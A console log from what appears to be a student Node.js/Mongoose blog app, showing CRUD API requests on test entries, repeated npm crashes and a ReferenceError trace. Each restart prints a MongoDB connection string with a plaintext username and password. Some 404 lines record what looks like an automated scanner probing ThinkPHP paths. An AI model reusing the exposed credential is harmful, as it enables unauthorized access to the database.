[0mGET /api//blogs/5c731c3e872de1ce8a0b7785 [32m200 [0m3.228 ms - 134[0m
Finding blog details { blogid: '5c731c59872de1ce8a0b7786' }
{ _id: 5c731c59872de1ce8a0b7786,
  blogTitle: '3rd Blog Title',
  blogText: '3rd Blog Text',
  dateOfCreation: 3050-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c59872de1ce8a0b7786 [32m200 [0m2.779 ms - 134[0m
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: 0000-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m3.169 ms - 135[0m
Finding blog details { blogid: '5c731c3e872de1ce8a0b7785' }
{ _id: 5c731c3e872de1ce8a0b7785,
  blogTitle: '2nd Blog Title',
  blogText: '2nd Blog Text',
  dateOfCreation: 3040-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c3e872de1ce8a0b7785 [32m200 [0m3.506 ms - 134[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5c731c59872de1ce8a0b7786,
    blogTitle: '3rd Blog Title',
    blogText: '3rd Blog Text',
    dateOfCreation: 3050-02-24T03:24:00.000Z },
  { _id: 5c9c92ac9524221232d27c4b,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api//blogs/ [32m200 [0m6.248 ms - 543[0m
{ blogTitle: 'postTestTitlteMon',
  blogText: 'postTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
{ _id: 5ca21ab7dec1f715cee48ccf,
  blogTitle: 'postTestTitlteMon',
  blogText: 'postTestBlogTextMon',
  dateOfCreation: 0000-02-24T03:24:00.000Z,
  __v: 0 }
[0mPOST /api//blogs/ [32m201 [0m21.905 ms - 151[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5c731c59872de1ce8a0b7786,
    blogTitle: '3rd Blog Title',
    blogText: '3rd Blog Text',
    dateOfCreation: 3050-02-24T03:24:00.000Z },
  { _id: 5c9c92ac9524221232d27c4b,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 },
  { _id: 5ca21ab7dec1f715cee48ccf,
    blogTitle: 'postTestTitlteMon',
    blogText: 'postTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api//blogs/ [32m200 [0m3.995 ms - 687[0m
[0mPUT /api//blogs/ [33m404 [0m2.170 ms - 1527[0m
[0mPUT /api//blogs/5ca21ab7dec1f715cee48ccf [32m200 [0m5.215 ms - 149[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlteMon',
  blogText: 'putTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5ca21ab7dec1f715cee48ccf [32m204 [0m2.179 ms - -[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlteMon',
  blogText: 'putTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5ca21ab7dec1f715cee48ccf [32m204 [0m2.333 ms - -[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-04-01T14_11_14_116Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Deleting blog entry with id of 5ca21ab7dec1f715cee48ccf
{ blogTitle: 'putTestTitlteMon',
  blogText: 'putTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
(node:23461) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
[0mDELETE /api//blogs/5ca21ab7dec1f715cee48ccf [32m204 [0m43.726 ms - -[0m
[0mGET /TP/public/index.php [33m404 [0m15.270 ms - 1539[0m
[0mGET /TP/index.php [33m404 [0m1.501 ms - 1539[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.942 ms - 1539[0m
[0mGET /html/public/index.php [33m404 [0m0.942 ms - 1539[0m
[0mGET /public/index.php [33m404 [0m0.865 ms - 1539[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.641 ms - 1539[0m
[0mGET /elrekt.php [33m404 [0m0.866 ms - 1539[0m
[0mGET /index.php [33m404 [0m0.704 ms - 1539[0m
[0mGET / [32m200 [0m1.444 ms - 967[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-04-01T14_24_42_798Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Deleting blog entry with id of 5c9c92ac9524221232d27c4b
{ blogTitle: 'putTestTitlteMon',
  blogText: 'putTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5c9c92ac9524221232d27c4b [31m500 [0m23.433 ms - 1649[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-04-01T14_25_49_187Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Deleting blog entry with id of 5c9c92ac9524221232d27c4b
{ blogTitle: 'putTestTitlteMon',
  blogText: 'putTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
(node:23602) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
events.js:183
      throw er; // Unhandled 'error' event
      ^

ReferenceError: locationid is not defined
    at /home/bitnami/lab4/blogger/app_api/controllers/blogs.js:141:36
    at /home/bitnami/lab4/blogger/node_modules/mongoose/lib/model.js:4698:16
    at /home/bitnami/lab4/blogger/node_modules/mongoose/lib/utils.js:263:16
    at _hooks.execPost (/home/bitnami/lab4/blogger/node_modules/mongoose/lib/query.js:4074:11)
    at /home/bitnami/lab4/blogger/node_modules/kareem/index.js:135:16
    at _combinedTickCallback (internal/process/next_tick.js:131:7)
    at process._tickCallback (internal/process/next_tick.js:180:9)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-04-01T14_26_07_321Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Deleting blog entry with id of 5c731c59872de1ce8a0b7786
{ blogTitle: 'putTestTitlteMon',
  blogText: 'putTestBlogTextMon',
  dateOfCreation: '0000-02-24T03:24:00Z' }
(node:23640) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
blog id 5c731c59872de1ce8a0b7786 deleted
[0mDELETE /api//blogs/5c731c59872de1ce8a0b7786 [32m204 [0m40.829 ms - -[0m
[0mGET / [32m200 [0m8.256 ms - 967[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-04-01T15_02_39_219Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
path = /api/blogs/5c731c1b872de1ce8a0b7784
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: 0000-02-24T03:24:00.000Z }
[0mGET /api/blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m37.613 ms - 135[0m
responseBody = [object Object]
body = {"_id":"5c731c1b872de1ce8a0b7784","blogTitle":"putTestTitlte","blogText":"putTestBlogText","dateOfCreation":"0000-02-24T03:24:00.000Z"}
[0mGET /blogEdit/5c731c1b872de1ce8a0b7784 [32m200 [0m69.055 ms - 1476[0m
[0mGET /stylesheets/style.css [36m304 [0m2.182 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m2.505 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m1.582 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.832 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.342 ms - -[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5ca2430536691c5ed7459128,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 },
  { _id: 5ca26e5417c04064a861c6a1,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api/blogs [32m200 [0m11.430 ms - 560[0m
[0mGET /blogList [36m304 [0m18.148 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.666 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.885 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m0.858 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.830 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.373 ms - -[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.778 ms - 1539[0m
path = /api/blogs/5ca2430536691c5ed7459128
Finding blog details { blogid: '5ca2430536691c5ed7459128' }
{ _id: 5ca2430536691c5ed7459128,
  blogTitle: 'viewTestTitlteMon',
  blogText: 'viewTestBlogTextMon',
  dateOfCreation: 0000-02-24T03:24:00.000Z,
  __v: 0 }
[0mGET /api/blogs/5ca2430536691c5ed7459128 [32m200 [0m4.494 ms - 151[0m
responseBody = [object Object]
body = {"_id":"5ca2430536691c5ed7459128","blogTitle":"viewTestTitlteMon","blogText":"viewTestBlogTextMon","dateOfCreation":"0000-02-24T03:24:00.000Z","__v":0}
[0mGET /blogEdit/5ca2430536691c5ed7459128 [32m200 [0m9.710 ms - 1484[0m
[0mGET /stylesheets/style.css [36m304 [0m0.350 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.340 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m2.774 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m1.982 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.319 ms - -[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5ca2430536691c5ed7459128,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 },
  { _id: 5ca26e5417c04064a861c6a1,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api/blogs [32m200 [0m3.695 ms - 560[0m
[0mGET /blogList [36m304 [0m6.842 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.301 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.253 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m0.574 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.649 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.245 ms - -[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.727 ms - 1539[0m
path = /api/blogs/5c731c3e872de1ce8a0b7785
Finding blog details { blogid: '5c731c3e872de1ce8a0b7785' }
{ _id: 5c731c3e872de1ce8a0b7785,
  blogTitle: '2nd Blog Title',
  blogText: '2nd Blog Text',
  dateOfCreation: 3040-02-24T03:24:00.000Z }
[0mGET /api/blogs/5c731c3e872de1ce8a0b7785 [32m200 [0m2.924 ms - 134[0m
responseBody = [object Object]
body = {"_id":"5c731c3e872de1ce8a0b7785","blogTitle":"2nd Blog Title","blogText":"2nd Blog Text","dateOfCreation":"3040-02-24T03:24:00.000Z"}
[0mGET /blogEdit/5c731c3e872de1ce8a0b7785 [32m200 [0m7.329 ms - 1475[0m
[0mGET /stylesheets/style.css [36m304 [0m0.269 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.244 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m0.703 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.632 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.237 ms - -[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5ca2430536691c5ed7459128,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 },
  { _id: 5ca26e5417c04064a861c6a1,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api/blogs [32m200 [0m4.025 ms - 560[0m
[0mGET /blogList [36m304 [0m7.695 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.343 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m1.046 ms - 1539[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m1.303 ms - -[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m1.995 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m1.310 ms - -[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.811 ms - 1539[0m
path = /api/blogs/5ca26e5417c04064a861c6a1
Finding blog details { blogid: '5ca26e5417c04064a861c6a1' }
{ _id: 5ca26e5417c04064a861c6a1,
  blogTitle: 'viewTestTitlteMon',
  blogText: 'viewTestBlogTextMon',
  dateOfCreation: 0000-02-24T03:24:00.000Z,
  __v: 0 }
[0mGET /api/blogs/5ca26e5417c04064a861c6a1 [32m200 [0m3.679 ms - 151[0m
responseBody = [object Object]
body = {"_id":"5ca26e5417c04064a861c6a1","blogTitle":"viewTestTitlteMon","blogText":"viewTestBlogTextMon","dateOfCreation":"0000-02-24T03:24:00.000Z","__v":0}
[0mGET /blogEdit/5ca26e5417c04064a861c6a1 [32m200 [0m8.183 ms - 1484[0m
[0mGET /stylesheets/style.css [36m304 [0m0.326 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.579 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m1.233 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.687 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.233 ms - -[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5ca2430536691c5ed7459128,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 },
  { _id: 5ca26e5417c04064a861c6a1,
    blogTitle: 'viewTestTitlteMon',
    blogText: 'viewTestBlogTextMon',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api/blogs [32m200 [0m2.960 ms - 560[0m
[0mGET /blogList [36m304 [0m6.332 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.528 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.647 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m0.625 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.655 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.303 ms - -[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.756 ms - 1539[0m
path = /api/blogs/5c731c1b872de1ce8a0b7784
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: 0000-02-24T03:24:00.000Z }
[0mGET /api/blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m3.193 ms - 135[0m
responseBody = [object Object]
body = {"_id":"5c731c1b872de1ce8a0b7784","blogTitle":"putTestTitlte","blogText":"putTestBlogText","dateOfCreation":"0000-02-24T03:24:00.000Z"}
[0mGET /blogEdit/5c731c1b872de1ce8a0b7784 [36m304 [0m7.382 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.324 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.301 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m2.118 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m2.847 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.301 ms - -[0m
[0mGET /blogDelete [36m304 [0m1.396 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.390 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.640 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m1.364 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m0.770 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m0.328 ms - -[0m
[0mGET /blogEdit/ [33m404 [0m1.639 ms - 1539[0m
[0mGET / [36m304 [0m78.369 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.470 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.560 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m1.775 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m2.265 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m2.334 ms - -[0m
[0mGET / [36m304 [0m0.968 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.627 ms - -[0m
[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.827 ms - -[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m0.855 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m1.049 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [36m304 [0m1.245 ms - -[0m
[0mGET / [32m200 [0m1.332 ms - 967[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-04-01T23_11_28_489Z-debug.log
